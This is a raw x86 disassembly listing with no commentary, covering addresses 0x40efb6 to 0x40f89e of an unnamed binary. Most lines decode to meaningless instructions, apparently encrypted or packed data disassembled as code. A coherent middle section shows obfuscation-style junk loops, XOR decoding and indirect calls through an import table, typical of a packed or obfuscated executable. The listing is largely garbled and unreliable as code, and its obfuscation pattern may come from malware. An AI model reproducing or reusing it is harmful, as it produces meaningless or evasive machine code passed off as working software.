  40efb6:	sub    DWORD PTR [ebp-0x33],ebx
  40efb9:	mov    cl,0xa
  40efbb:	adc    BYTE PTR [esi],al
  40efbd:	or     eax,0xea02b5c6
  40efc2:	pop    ecx
  40efc3:	sbb    BYTE PTR [edi+0x30019a63],al
  40efc9:	inc    ebx
  40efca:	sbb    eax,ecx
  40efcc:	js     0x40efd8
  40efce:	sub    al,0x96
  40efd0:	adc    BYTE PTR [esi-0x38],ah
  40efd3:	dec    eax
  40efd4:	xor    eax,0xf18c8e2d
  40efd9:	das    
  40efda:	cmp    DWORD PTR [ebx+0x462d32e],esi
  40efe0:	aaa    
  40efe1:	mov    esi,edi
  40efe3:	rcl    BYTE PTR [ebx+0x30],cl
  40efe6:	retf   0xcc15
  40efe9:	mov    edi,0xac2ba947
  40efee:	pop    eax
  40efef:	sbb    DWORD PTR [edx-0x276f0633],ebp
  40eff5:	mov    bl,0x66
  40eff7:	sti    
  40eff8:	dec    edi
  40eff9:	stos   BYTE PTR es:[edi],al
  40effa:	pop    esp
  40effb:	call   0x25e9:0xb48fcb7d
  40f002:	enter  0x547f,0xa5
  40f006:	enter  0xec60,0x2
  40f00a:	adc    esi,DWORD PTR [ebp-0x434e93b4]
  40f010:	loop   0x40efc7
  40f012:	les    esp,FWORD PTR [ebx+eax*2-0x5a]
  40f016:	mov    dl,0x66
  40f018:	adc    edi,DWORD PTR [edi+0x31]
  40f01b:	xchg   ebx,eax
  40f01c:	loopne 0x40f039
  40f01e:	inc    ebx
  40f01f:	stc    
  40f020:	xchg   ebx,eax
  40f021:	mov    ecx,0x20523c24
  40f026:	icebp  
  40f027:	les    edx,FWORD PTR [ebp+0x16927943]
  40f02d:	push   es
  40f02e:	mov    gs,WORD PTR [esi]
  40f030:	call   0x8246ad6a
  40f035:	ror    ch,0x91
  40f038:	stos   BYTE PTR es:[edi],al
  40f039:	xor    cl,BYTE PTR ds:0xdf416aa7
  40f03f:	mov    ecx,0x10cd5255
  40f044:	imul   esi,DWORD PTR [edi],0xe8a915a4
  40f04a:	loopne 0x40f08a
  40f04c:	shl    DWORD PTR [eax-0x423c4429],1
  40f052:	sub    DWORD PTR [eax],0xce2b2561
  40f058:	pop    ebp
  40f059:	inc    esi
  40f05a:	dec    edx
  40f05b:	lods   al,BYTE PTR ds:[esi]
  40f05c:	pop    ebp
  40f05d:	xchg   ebx,eax
  40f05e:	std    
  40f05f:	mov    esp,0xab4691e5
  40f064:	pop    ds
  40f065:	imul   edx,DWORD PTR [ebx+edx*4],0x57e8c01e
  40f06c:	xor    DWORD PTR [ecx-0x5d76a0f2],esp
  40f072:	mov    edi,0xa2022d86
  40f077:	jg     0x40f04c
  40f079:	xchg   edx,eax
  40f07a:	inc    ebx
  40f07b:	mov    bh,0xe6
  40f07d:	dec    edi
  40f07e:	sahf   
  40f07f:	popa   
  40f080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f081:	mov    ch,0x9c
  40f083:	pop    es
  40f084:	dec    eax
  40f085:	inc    esi
  40f086:	adc    eax,0x65058ae0
  40f08b:	push   esp
  40f08c:	outs   dx,BYTE PTR ds:[esi]
  40f08d:	xor    eax,0xcba0b87
  40f092:	cmp    ah,BYTE PTR [ecx+0x41]
  40f095:	pusha  
  40f096:	push   DWORD PTR [esi+eiz*2+0x7c]
  40f09a:	sahf   
  40f09b:	mov    DWORD PTR [edi-0x34],edi
  40f09e:	mov    edx,0x8a45da58
  40f0a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a4:	sbb    cl,BYTE PTR [eax]
  40f0a6:	stc    
  40f0a7:	mov    esp,0x3e8d5cb1
  40f0ac:	mov    BYTE PTR [edx+esi*4+0x21],bl
  40f0b0:	jo     0x40f0c8
  40f0b2:	and    dh,BYTE PTR [edx-0x4b0d7380]
  40f0b8:	xchg   esp,eax
  40f0b9:	inc    ebx
  40f0ba:	int3   
  40f0bb:	pop    es
  40f0bc:	popf   
  40f0bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0be:	inc    esp
  40f0bf:	inc    ebp
  40f0c0:	sub    al,0x5d
  40f0c2:	and    eax,0x45994721
  40f0c7:	mov    ah,0xaa
  40f0c9:	sub    edx,edx
  40f0cb:	dec    esi
  40f0cc:	xchg   edx,eax
  40f0cd:	xlat   BYTE PTR ds:[ebx]
  40f0ce:	jg     0x40f0ba
  40f0d0:	(bad)  
  40f0d1:	jecxz  0x40f0eb
  40f0d3:	sub    ebp,esp
  40f0d5:	cs leave 
  40f0d7:	adc    al,0x3a
  40f0d9:	inc    edx
  40f0da:	or     esi,esp
  40f0dc:	push   edi
  40f0dd:	loop   0x40f0d1
  40f0df:	jle    0x40f10d
  40f0e1:	jmp    0x899d793e
  40f0e6:	and    ebp,DWORD PTR [ecx]
  40f0e8:	push   0xffffffa2
  40f0ea:	push   edi
  40f0eb:	into   
  40f0ec:	pop    ds
  40f0ed:	mov    cl,0xf2
  40f0ef:	neg    BYTE PTR [esi+0x12]
  40f0f2:	std    
  40f0f3:	mov    cl,BYTE PTR [eax]
  40f0f5:	in     eax,0x42
  40f0f7:	pop    esi
  40f0f8:	jb     0x40f10d
  40f0fa:	xor    eax,0xf6933bb7
  40f0ff:	(bad)  
  40f100:	mov    ebx,0xbcc38a5b
  40f105:	(bad)  
  40f106:	jns    0x40f115
  40f108:	rol    DWORD PTR [esi],1
  40f10a:	mov    al,ds:0xa44161ee
  40f10f:	pop    ebp
  40f110:	ficom  DWORD PTR [ebx-0xc]
  40f113:	fmul   QWORD PTR [ebp-0x642fe6c]
  40f119:	push   ebp
  40f11a:	and    dl,al
  40f11c:	(bad)  
  40f11d:	call   0x7e6751e2
  40f122:	cli    
  40f123:	sub    DWORD PTR [ecx],ebx
  40f125:	pop    es
  40f126:	xor    DWORD PTR [edx+0x1b82402e],edi
  40f12c:	bound  esi,QWORD PTR [esi+0x12]
  40f12f:	mov    ah,bl
  40f131:	cmc    
  40f132:	dec    ecx
  40f133:	jmp    0x40f0ba
  40f135:	cmp    DWORD PTR [edi-0x6dc30651],esp
  40f13b:	es add edx,edx
  40f13e:	adc    ah,dl
  40f140:	js     0x40f18d
  40f142:	mov    ebx,0x91e19b12
  40f147:	int    0x93
  40f149:	sub    BYTE PTR [esi+0x6f4bd33e],al
  40f14f:	in     eax,dx
  40f150:	sti    
  40f151:	mov    bh,BYTE PTR [ebx+0x60]
  40f154:	inc    ebx
  40f155:	nop
  40f156:	gs mov dh,0x1d
  40f159:	cld    
  40f15a:	inc    edx
  40f15b:	call   0x7616:0x6d43a9e4
  40f162:	les    ebp,FWORD PTR [eax]
  40f164:	sub    cl,al
  40f166:	jmp    0x40f1cc
  40f168:	mov    al,ds:0xc8c7afad
  40f16d:	shl    DWORD PTR [ebp+0x4f],1
  40f170:	adc    esp,DWORD PTR [ebp+0xe2504fb]
  40f176:	ss pop ecx
  40f178:	bound  ecx,QWORD PTR [esi+edi*4]
  40f17b:	mov    ss,WORD PTR [ecx+0x59]
  40f17e:	ds aam 0x33
  40f181:	mov    al,0x9d
  40f183:	dec    eax
  40f184:	inc    ebp
  40f185:	fwait
  40f186:	cmp    ax,0x1383
  40f18a:	xor    DWORD PTR [ebx],esi
  40f18c:	jmp    0x40f197
  40f18e:	pusha  
  40f18f:	pop    ecx
  40f190:	push   ds
  40f191:	xor    DWORD PTR [ebx+0x2b],ecx
  40f194:	mov    edx,0xcc37277a
  40f199:	scas   eax,DWORD PTR es:[edi]
  40f19a:	rcl    BYTE PTR [ecx-0x4],0x77
  40f19e:	in     eax,0x27
  40f1a0:	or     edx,DWORD PTR ss:[edi+eiz*2-0x6311dc0c]
  40f1a8:	jmp    0xd5496556
  40f1ad:	test   al,0x40
  40f1af:	dec    eax
  40f1b0:	add    edi,DWORD PTR [ebp+0x4a9bc2f2]
  40f1b6:	inc    ebx
  40f1b7:	(bad)  
  40f1b8:	fwait
  40f1b9:	int    0x51
  40f1bb:	jmp    0x40f19e
  40f1bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1be:	jmp    0x97b5f017
  40f1c3:	ret    0x5dcc
  40f1c6:	nop
  40f1c7:	sahf   
  40f1c8:	out    dx,eax
  40f1c9:	dec    ebp
  40f1ca:	xchg   esi,eax
  40f1cb:	xchg   edx,ecx
  40f1cd:	dec    edi
  40f1ce:	jg     0x40f17b
  40f1d0:	add    eax,0x877ddfa
  40f1d5:	cmp    al,BYTE PTR [ebp-0x32e42a34]
  40f1db:	jg     0x40f1f4
  40f1dd:	addr16 jmp 0x5c72:0xeff39e97
  40f1e5:	ret    0xdb8
  40f1e8:	test   al,0xaa
  40f1ea:	fcomp  QWORD PTR [eax]
  40f1ec:	mov    WORD PTR [ebx],?
  40f1ee:	push   es
  40f1ef:	add    BYTE PTR [ebp+0x45],bl
  40f1f2:	push   ebp
  40f1f3:	fbstp  TBYTE PTR [eax]
  40f1f5:	add    eax,DWORD PTR [ebx]
  40f1f7:	xor    al,0xb0
  40f1f9:	rcl    BYTE PTR gs:[ebx-0x79230b6c],0x54
  40f201:	xchg   ebx,ecx
  40f203:	adc    eax,0xfa625e23
  40f208:	dec    eax
  40f209:	or     eax,0xcf06c6de
  40f20e:	and    eax,0x4e8990e2
  40f213:	int    0x50
  40f215:	fnstsw WORD PTR [ebx+0x770994d4]
  40f21b:	push   0x811adeda
  40f220:	sub    al,0x1a
  40f222:	lahf   
  40f223:	push   DWORD PTR cs:[edx-0x33]
  40f227:	adc    al,0x19
  40f229:	push   0xb02fd6c
  40f22e:	xchg   esp,eax
  40f22f:	out    0xb1,eax
  40f231:	add    bl,BYTE PTR [ebx]
  40f233:	fstp   QWORD PTR [esi]
  40f235:	aam    0x62
  40f237:	aaa    
  40f238:	jnp    0x40f278
  40f23a:	imul   WORD PTR [esi+0x16]
  40f23e:	dec    eax
  40f23f:	mov    esi,0x50d803fa
  40f244:	pop    eax
  40f245:	jno    0x40f253
  40f247:	fwait
  40f248:	loop   0x40f27f
  40f24a:	ja     0x40f252
  40f24c:	rcl    DWORD PTR ds:0x5ffc6cb0,cl
  40f252:	lds    edx,FWORD PTR [ebx+edi*4+0x769c6ef1]
  40f259:	cmp    BYTE PTR ds:0xc33b5f8a,dh
  40f25f:	popa   
  40f260:	mov    esi,0x2f25a487
  40f265:	or     eax,0x763538c7
  40f26a:	mov    bh,0xed
  40f26c:	sbb    ah,BYTE PTR [esi+0x49]
  40f26f:	loop   0x40f2ac
  40f271:	inc    ebx
  40f272:	or     DWORD PTR [ebp-0x296b784d],0xe3b47d90
  40f27c:	jae    0x40f2e0
  40f27e:	adc    ebp,esi
  40f280:	test   DWORD PTR [ecx+0x670abe51],edi
  40f286:	rcr    DWORD PTR [esi-0x3c],cl
  40f289:	jo     0x40f210
  40f28b:	mov    cl,0x8
  40f28d:	or     al,0xfd
  40f28f:	pop    ebp
  40f290:	pushf  
  40f291:	in     eax,0xa6
  40f293:	xchg   ch,ch
  40f295:	jno    0x40f294
  40f297:	cs or  ah,al
  40f29a:	dec    esp
  40f29b:	jns    0x40f2d0
  40f29d:	in     eax,dx
  40f29e:	sbb    BYTE PTR [ebx+0x30],al
  40f2a1:	scas   al,BYTE PTR es:[edi]
  40f2a2:	xchg   esp,eax
  40f2a3:	out    dx,eax
  40f2a4:	xchg   ebp,eax
  40f2a5:	hlt    
  40f2a6:	icebp  
  40f2a7:	in     al,0x7b
  40f2a9:	xchg   edx,eax
  40f2aa:	out    0xb0,eax
  40f2ac:	cwde   
  40f2ad:	jge    0x40f2a1
  40f2af:	mov    ch,BYTE PTR [esp+edx*2-0x18f34135]
  40f2b6:	fwait
  40f2b7:	ror    DWORD PTR ds:0xdb5073bf,cl
  40f2bd:	xor    DWORD PTR [eax-0x5d8f4b5a],ebx
  40f2c3:	jg     0x40f26c
  40f2c5:	int3   
  40f2c6:	cmp    eax,0x5d61c0fc
  40f2cb:	ss push edi
  40f2cd:	xchg   BYTE PTR [esp+ebx*1-0x78],al
  40f2d1:	sbb    eax,0x184e42f
  40f2d6:	push   edx
  40f2d7:	test   al,0xe9
  40f2d9:	jmp    0x40f287
  40f2db:	fs fwait
  40f2dd:	cmp    eax,0xe50a2316
  40f2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2e3:	cmp    al,0x9f
  40f2e5:	(bad)  
  40f2e6:	sub    esp,DWORD PTR [ecx]
  40f2e8:	jp     0x40f353
  40f2ea:	outs   dx,DWORD PTR ds:[esi]
  40f2eb:	stc    
  40f2ec:	cmp    dh,BYTE PTR [esp+eax*1-0x25]
  40f2f0:	xchg   ecx,eax
  40f2f1:	shl    edx,0x37
  40f2f4:	pushf  
  40f2f5:	into   
  40f2f6:	sti    
  40f2f7:	adc    ebp,DWORD PTR [ebp+0xc7e188a]
  40f2fd:	mov    al,0x2
  40f2ff:	jne    0x40f281
  40f301:	and    al,0x64
  40f303:	jge    0x40f34c
  40f305:	loop   0x40f2a4
  40f307:	mov    al,ds:0x8c54f77b
  40f30c:	js     0x40f2fc
  40f30e:	push   esp
  40f30f:	mov    edx,0x68bab92f
  40f314:	dec    esi
  40f315:	div    BYTE PTR [eax]
  40f317:	loope  0x40f356
  40f319:	push   edi
  40f31a:	jns    0x40f369
  40f31c:	sbb    DWORD PTR [eax*1+0x4776942f],ecx
  40f323:	push   ds
  40f324:	sbb    dh,BYTE PTR [edi+ebp*4-0x4]
  40f328:	ins    BYTE PTR es:[edi],dx
  40f329:	retf   
  40f32a:	mov    al,0x73
  40f32c:	leave  
  40f32d:	mov    dl,0x4d
  40f32f:	rcr    DWORD PTR [eax],1
  40f331:	mov    ebp,0x22e7199a
  40f336:	rcl    DWORD PTR [esi-0x7121bda],1
  40f33c:	pop    ss
  40f33d:	pop    esp
  40f33e:	cmp    dl,bh
  40f340:	lea    ecx,[ebx]
  40f342:	enter  0xe1c3,0xe3
  40f346:	jl     0x40f2d1
  40f348:	js     0x40f337
  40f34a:	mov    eax,ds:0xf709c324
  40f34f:	(bad)  
  40f350:	in     eax,dx
  40f351:	or     al,0x89
  40f353:	add    edx,edi
  40f355:	or     DWORD PTR ds:0x434004,0x43601c
  40f35f:	and    edx,ebx
  40f361:	mov    DWORD PTR [ebp-0x4c],edx
  40f364:	sbb    ebx,edx
  40f366:	mov    edx,DWORD PTR [ebp+0x8]
  40f369:	and    ebx,DWORD PTR ds:0x436000
  40f36f:	mov    ebx,DWORD PTR [ebp-0x48]
  40f372:	and    DWORD PTR ds:0x434008,0x438000
  40f37c:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f383:	movzx  ebx,BYTE PTR ds:0x437010
  40f38a:	and    DWORD PTR ds:0x438004,ebx
  40f390:	mov    DWORD PTR [ebp-0x48],edx
  40f393:	and    ebx,DWORD PTR ds:0x43501c
  40f399:	mov    edx,DWORD PTR [ebp+0x8]
  40f39c:	mov    ebx,0xfa5e15e2
  40f3a1:	sub    ebx,edx
  40f3a3:	or     DWORD PTR ds:0x43801c,0x224f
  40f3ad:	add    ebx,DWORD PTR [ebp-0x44]
  40f3b0:	mov    DWORD PTR [ebp-0x44],ebx
  40f3b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f3b6:	xor    edx,eax
  40f3b8:	or     DWORD PTR ds:0x43801c,0x42c8
  40f3c2:	add    edx,esi
  40f3c4:	mov    DWORD PTR ds:0x434008,0x7004
  40f3ce:	jne    0x40ab4e
  40f3d4:	jmp    0x4163dd
  40f3d9:	mov    DWORD PTR ds:0x438008,0x1c
  40f3e3:	cmp    DWORD PTR ds:0x438008,0x0
  40f3ea:	je     0x40f448
  40f3f0:	cmp    DWORD PTR ds:0x438008,0x4
  40f3f7:	jl     0x40f448
  40f3fd:	jmp    0x40f41a
  40f402:	push   DWORD PTR [ebp-0x24]
  40f405:	push   0x3847
  40f40a:	push   0x753d
  40f40f:	push   0x26fc
  40f414:	call   DWORD PTR ds:0x43a8e8
  40f41a:	cmp    DWORD PTR ds:0x438008,0x5
  40f421:	jne    0x40f436
  40f427:	xor    edx,edx
  40f429:	xor    edx,DWORD PTR ds:0x438008
  40f42f:	dec    edx
  40f430:	mov    DWORD PTR ds:0x438008,edx
  40f436:	mov    edx,DWORD PTR ds:0x438008
  40f43c:	dec    edx
  40f43d:	mov    DWORD PTR ds:0x438008,edx
  40f443:	jmp    0x40f3e3
  40f448:	mov    edx,DWORD PTR [ebp-0xc]
  40f44b:	neg    DWORD PTR ds:0x434004
  40f451:	sub    edx,esi
  40f453:	xor    edx,eax
  40f455:	mov    DWORD PTR [ebp-0x5c],edx
  40f458:	mov    edx,DWORD PTR [ebp-0x10]
  40f45b:	mov    ebx,DWORD PTR [ebp-0x8]
  40f45e:	or     DWORD PTR ds:0x438018,0x434020
  40f468:	xor    edx,eax
  40f46a:	xor    ebx,eax
  40f46c:	adc    DWORD PTR ds:0x438000,0x7999
  40f476:	sub    edx,ebx
  40f478:	and    DWORD PTR ds:0x43500c,0x6f6
  40f482:	sub    edx,esi
  40f484:	xor    edx,eax
  40f486:	mov    DWORD PTR [ebp-0x10],edx
  40f489:	mov    DWORD PTR ds:0x435000,0x69ba
  40f493:	mov    edx,DWORD PTR [ebp-0x14]
  40f496:	mov    DWORD PTR ds:0x436008,0x7efb
  40f4a0:	mov    DWORD PTR [ebp+0x8],edx
  40f4a3:	jmp    0x40f6a5
  40f4a8:	mov    DWORD PTR ds:0x434000,0x12
  40f4b2:	cmp    DWORD PTR ds:0x434000,0x0
  40f4b9:	je     0x40f505
  40f4bf:	cmp    DWORD PTR ds:0x434000,0x4
  40f4c6:	jb     0x40f505
  40f4cc:	jmp    0x40f4d7
  40f4d1:	call   DWORD PTR ds:0x43a8f0
  40f4d7:	cmp    DWORD PTR ds:0x434000,0x5
  40f4de:	jne    0x40f4f3
  40f4e4:	xor    edx,edx
  40f4e6:	xor    edx,DWORD PTR ds:0x434000
  40f4ec:	dec    edx
  40f4ed:	mov    DWORD PTR ds:0x434000,edx
  40f4f3:	mov    edx,DWORD PTR ds:0x434000
  40f4f9:	dec    edx
  40f4fa:	mov    DWORD PTR ds:0x434000,edx
  40f500:	jmp    0x40f4b2
  40f505:	mov    edx,DWORD PTR [ebp+0x8]
  40f508:	mov    ebx,DWORD PTR [ebp-0x8]
  40f50b:	adc    DWORD PTR ds:0x436008,0x434014
  40f515:	xor    edx,eax
  40f517:	sub    DWORD PTR ds:0x438010,0x434018
  40f521:	xor    ebx,eax
  40f523:	sub    edx,ebx
  40f525:	sub    edx,esi
  40f527:	and    DWORD PTR ds:0x437014,0x0
  40f531:	mov    ebx,DWORD PTR ds:0x437014
  40f537:	inc    ebx
  40f538:	mov    DWORD PTR ds:0x437014,ebx
  40f53e:	cmp    DWORD PTR ds:0x437014,0x4
  40f545:	jge    0x40f582
  40f54b:	jmp    0x40f55b
  40f550:	push   0x7690
  40f555:	call   DWORD PTR ds:0x43a8f4
  40f55b:	cmp    DWORD PTR ds:0x437014,0x3
  40f562:	jne    0x40f575
  40f568:	mov    ebx,DWORD PTR ds:0x437014
  40f56e:	inc    ebx
  40f56f:	mov    DWORD PTR ds:0x437014,ebx
  40f575:	cmp    DWORD PTR ds:0x437014,0x1b
  40f57c:	jb     0x40f531
  40f582:	xor    edx,eax
  40f584:	movzx  ebx,WORD PTR ds:0x435010
  40f58b:	adc    DWORD PTR ds:0x434020,ebx
  40f591:	mov    DWORD PTR [ebp+0x8],edx
  40f594:	and    DWORD PTR ds:0x435018,0x0
  40f59e:	jmp    0x40f5b0
  40f5a3:	mov    edx,DWORD PTR ds:0x435018
  40f5a9:	inc    edx
  40f5aa:	mov    DWORD PTR ds:0x435018,edx
  40f5b0:	cmp    DWORD PTR ds:0x435018,0x18
  40f5b7:	jae    0x40f5e4
  40f5bd:	cmp    DWORD PTR ds:0x435018,0x22
  40f5c4:	jbe    0x40f5e4
  40f5ca:	jmp    0x40f5df
  40f5cf:	push   0x6f28
  40f5d4:	push   0x4b78
  40f5d9:	call   DWORD PTR ds:0x43a8f8
  40f5df:	jmp    0x40f5a3
  40f5e4:	mov    edx,DWORD PTR [ebp+0x8]
  40f5e7:	sbb    DWORD PTR ds:0x434004,edx
  40f5ed:	mov    ebx,DWORD PTR [ebp-0x58]
  40f5f0:	add    edx,0x5708c4
  40f5f6:	adc    DWORD PTR ds:0x437004,0x434004
  40f600:	imul   edx,ebx
  40f603:	mov    ebx,DWORD PTR ds:0x43701c
  40f609:	adc    DWORD PTR ds:0x43801c,ebx
  40f60f:	mov    DWORD PTR [ebp-0x58],edx
  40f612:	mov    edx,DWORD PTR [ebp+0x8]
  40f615:	xor    DWORD PTR ds:0x435010,edx
  40f61b:	mov    ebx,DWORD PTR [ebp-0x54]
  40f61e:	adc    DWORD PTR ds:0x43600c,0x437010
  40f628:	add    edx,0x64f8da
  40f62e:	or     edx,ebx
  40f630:	mov    DWORD PTR [ebp-0x54],edx
  40f633:	mov    edx,DWORD PTR [ebp+0x8]
  40f636:	adc    ebx,DWORD PTR ds:0x436014
  40f63c:	mov    ebx,DWORD PTR [ebp-0x50]
  40f63f:	add    edx,ecx
  40f641:	adc    DWORD PTR ds:0x43401c,0x78dc
  40f64b:	xor    edx,ebx
  40f64d:	adc    DWORD PTR ds:0x437014,0x50e3
  40f657:	mov    DWORD PTR [ebp-0x50],edx
  40f65a:	adc    DWORD PTR ds:0x434008,0x291b
  40f664:	mov    edx,DWORD PTR [ebp+0x8]
  40f667:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f66a:	and    DWORD PTR ds:0x438010,0x434004
  40f674:	add    edx,edi
  40f676:	add    DWORD PTR ds:0x436018,0x43800c
  40f680:	and    edx,ebx
  40f682:	mov    DWORD PTR [ebp-0x4c],edx
  40f685:	mov    edx,DWORD PTR [ebp+0x8]
  40f688:	mov    ebx,DWORD PTR [ebp-0x48]
  40f68b:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f692:	mov    DWORD PTR [ebp-0x48],edx
  40f695:	mov    edx,DWORD PTR [ebp+0x8]
  40f698:	mov    ebx,0xfa5e15e2
  40f69d:	sub    ebx,edx
  40f69f:	add    ebx,DWORD PTR [ebp-0x44]
  40f6a2:	mov    DWORD PTR [ebp-0x44],ebx
  40f6a5:	mov    edx,DWORD PTR [ebp+0x8]
  40f6a8:	xor    edx,eax
  40f6aa:	add    edx,esi
  40f6ac:	jne    0x40f4a8
  40f6b2:	mov    edx,DWORD PTR [ebp-0xc]
  40f6b5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6bc:	mov    bl,BYTE PTR [ebp-0x1]
  40f6bf:	cmp    dl,bl
  40f6c1:	je     0x411b53
  40f6c7:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6ca:	mov    edx,DWORD PTR [ebp-0xc]
  40f6cd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6d4:	mov    ebx,DWORD PTR [ebp+0xc]
  40f6d7:	xor    ecx,eax
  40f6d9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  40f6e0:	jne    0x4163ef
  40f6e6:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6e9:	mov    edx,DWORD PTR [ebp+0xc]
  40f6ec:	xor    ecx,eax
  40f6ee:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  40f6f6:	jmp    0x411aaa
  40f6fb:	ficomp WORD PTR ds:0x81a319e0
  40f701:	xchg   DWORD PTR [ebx-0x12a5fb05],ebx
  40f707:	mov    eax,ds:0xdc13c672
  40f70c:	int    0x7c
  40f70e:	jl     0x40f6fb
  40f710:	pop    edi
  40f711:	jl     0x40f78f
  40f713:	xchg   DWORD PTR [eax],esi
  40f715:	rol    DWORD PTR [esi-0x3c],cl
  40f718:	add    eax,0x1689c4fc
  40f71d:	jg     0x40f710
  40f71f:	arpl   bp,cx
  40f721:	not    ebx
  40f723:	cmp    eax,0x4702aae
  40f728:	sub    DWORD PTR [ebx+esi*4-0x527974dd],ebx
  40f72f:	xor    al,0x73
  40f731:	(bad)  
  40f732:	xor    al,0x16
  40f734:	(bad)  
  40f735:	and    BYTE PTR ds:0x6375a5b9,ch
  40f73b:	or     dl,al
  40f73d:	outs   dx,BYTE PTR ds:[esi]
  40f73e:	mov    ch,0x16
  40f740:	lods   al,BYTE PTR ds:[esi]
  40f741:	(bad)  
  40f742:	into   
  40f743:	dec    edx
  40f744:	sbb    BYTE PTR [eax-0x3db8678f],bh
  40f74a:	int3   
  40f74b:	or     eax,0x7af82316
  40f750:	dec    ecx
  40f751:	int    0x3d
  40f753:	sbb    DWORD PTR [eax],eax
  40f755:	sbb    eax,DWORD PTR [ecx-0x2810692a]
  40f75b:	ja     0x40f6e9
  40f75d:	add    BYTE PTR [eax-0x15],bl
  40f760:	mov    eax,ds:0xe3e4becc
  40f765:	add    ebp,DWORD PTR [ebp+0x57]
  40f768:	push   0x509be049
  40f76d:	jl     0x40f7cd
  40f76f:	jne    0x40f783
  40f771:	std    
  40f772:	xchg   BYTE PTR [esi-0xc],cl
  40f775:	mov    ah,BYTE PTR [ebx]
  40f777:	aam    0xbf
  40f779:	jae    0x40f76f
  40f77b:	rcl    DWORD PTR [edi],0x29
  40f77e:	sub    eax,0xf2ec3c
  40f783:	ds jge 0x40f7c3
  40f786:	push   edx
  40f787:	rol    BYTE PTR [edx+0x410e7534],1
  40f78d:	int    0x3d
  40f78f:	enter  0xd74,0xb8
  40f793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f794:	inc    esi
  40f795:	push   es
  40f796:	data16 fild QWORD PTR [eax]
  40f799:	es pop ss
  40f79b:	ins    BYTE PTR es:[edi],dx
  40f79c:	add    cl,BYTE PTR ds:0x1f630228
  40f7a2:	int    0x70
  40f7a4:	popf   
  40f7a5:	jno    0x40f7cf
  40f7a7:	cli    
  40f7a8:	(bad)  
  40f7a9:	cs push ebp
  40f7ab:	loop   0x40f7f0
  40f7ad:	stos   DWORD PTR es:[edi],eax
  40f7ae:	push   es
  40f7af:	xchg   BYTE PTR [esi-0x746bfcc0],ch
  40f7b5:	xchg   esp,eax
  40f7b6:	fbstp  TBYTE PTR [edi-0x5c]
  40f7b9:	clc    
  40f7ba:	jp     0x40f791
  40f7bc:	leave  
  40f7bd:	inc    ebp
  40f7be:	loope  0x40f742
  40f7c0:	pop    eax
  40f7c1:	test   eax,0xac504b2a
  40f7c6:	stc    
  40f7c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c8:	or     eax,0xb7a3592a
  40f7cd:	push   esi
  40f7ce:	jmp    0x48f9b1b6
  40f7d3:	and    edx,DWORD PTR [ebx+0x5276134d]
  40f7d9:	data16 sti 
  40f7db:	pop    ecx
  40f7dc:	mov    edx,0x8366c9f7
  40f7e1:	lahf   
  40f7e2:	scas   eax,DWORD PTR es:[edi]
  40f7e3:	mov    edx,0x43290a54
  40f7e8:	push   edi
  40f7e9:	jns    0x40f7cb
  40f7eb:	dec    edx
  40f7ec:	mov    ?,WORD PTR [ebp+0x64]
  40f7ef:	mov    ebx,0x725b2420
  40f7f4:	or     eax,0x17149fcc
  40f7f9:	inc    esp
  40f7fa:	in     eax,0x7
  40f7fc:	xchg   ecx,eax
  40f7fd:	in     eax,dx
  40f7fe:	mov    ?,WORD PTR [eax+ebp*8-0x69]
  40f802:	stos   BYTE PTR es:[edi],al
  40f803:	sbb    eax,0x1fe8fd20
  40f808:	dec    BYTE PTR [edi+0x5a]
  40f80b:	mov    al,0x1b
  40f80d:	int    0x97
  40f80f:	cmp    cl,dh
  40f811:	sbb    DWORD PTR [ecx+0x6f],edi
  40f814:	into   
  40f815:	repnz addr16 cmovge ebx,eax
  40f81a:	(bad)  
  40f81b:	mov    al,ds:0xab86dac0
  40f820:	jle    0x40f7f1
  40f822:	lods   al,BYTE PTR ds:[esi]
  40f823:	add    eax,0xee4567cb
  40f828:	mov    eax,0x806bf556
  40f82d:	fdivr  QWORD PTR [ebx]
  40f82f:	cmc    
  40f830:	xor    al,0x89
  40f832:	xchg   esi,eax
  40f834:	aaa    
  40f835:	pop    edx
  40f836:	add    cl,ah
  40f838:	mov    dl,bh
  40f83a:	adc    BYTE PTR [eax+ebp*4],ah
  40f83d:	adc    edi,edx
  40f83f:	out    0x6f,eax
  40f841:	(bad)  
  40f842:	ret    
  40f843:	inc    edx
  40f844:	clc    
  40f845:	dec    esi
  40f846:	lock mov eax,0xef1bbe66
  40f84c:	mov    ebx,0x797c0714
  40f851:	test   DWORD PTR [edx+0x26156e9b],edi
  40f857:	mov    bl,0x70
  40f859:	addr16 bnd jmp 0x40f862
  40f85d:	aam    0xd4
  40f85f:	fadd   st(5),st
  40f861:	dec    esi
  40f862:	push   es
  40f863:	cdq    
  40f864:	dec    ebx
  40f865:	test   DWORD PTR [edi-0x58389df0],esi
  40f86b:	or     dl,dh
  40f86d:	mov    ebx,0x9d227205
  40f872:	(bad)
  40f875:	sub    dl,BYTE PTR [eax]
  40f877:	jmp    0xfdda92b5
  40f87c:	not    BYTE PTR [ecx+ecx*2+0x32]
  40f880:	repz (bad) 
  40f882:	(bad)  [esi+0x13]
  40f885:	mov    dh,0x8f
  40f887:	xchg   ecx,eax
  40f888:	js     0x40f8a1
  40f88a:	pop    esi
  40f88b:	pop    ss
  40f88c:	cmc    
  40f88d:	js     0x40f8a5
  40f88f:	fs jb  0x40f8a0
  40f892:	scas   al,BYTE PTR es:[edi]
  40f893:	mov    bh,BYTE PTR [eax]
  40f895:	xor    DWORD PTR [ecx+0x192a1fda],edi
  40f89b:	scas   eax,DWORD PTR es:[edi]
  40f89c:	iret   
  40f89d:	scas   eax,DWORD PTR es:[edi]
  40f89e:	mov    ebx,0xba0b504f
